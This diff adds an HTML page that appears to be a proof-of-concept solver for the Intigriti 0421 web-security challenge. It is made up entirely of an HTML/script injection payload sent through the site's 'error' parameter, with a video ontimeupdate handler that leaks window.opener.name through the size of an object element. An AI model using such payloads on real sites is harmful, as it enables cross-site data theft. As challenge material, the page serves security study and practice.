@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="icon" href="data:;base64,iVBORw0KGgo=" />
+  </head>
+  <body>
+    <script>
+      if (location.search.includes("not") === false) {
+        w = window.open(
+          `https://challenge-0421.intigriti.io/?error=` +
+            encodeURIComponent(
+              `<object id=poc data=http://localhost:3000/solver.html width=101 height=101></object>
+              <video muted loop autoplay src=https://www.w3schools.com/jsref/mov_bbb.mp4 
+                ontimeupdate=window.opener.name<identifier?poc.height++:poc.width++>`
+            ),
+          "_blank"
+        );
+      }
+    </script>
+  </body>
+</html>
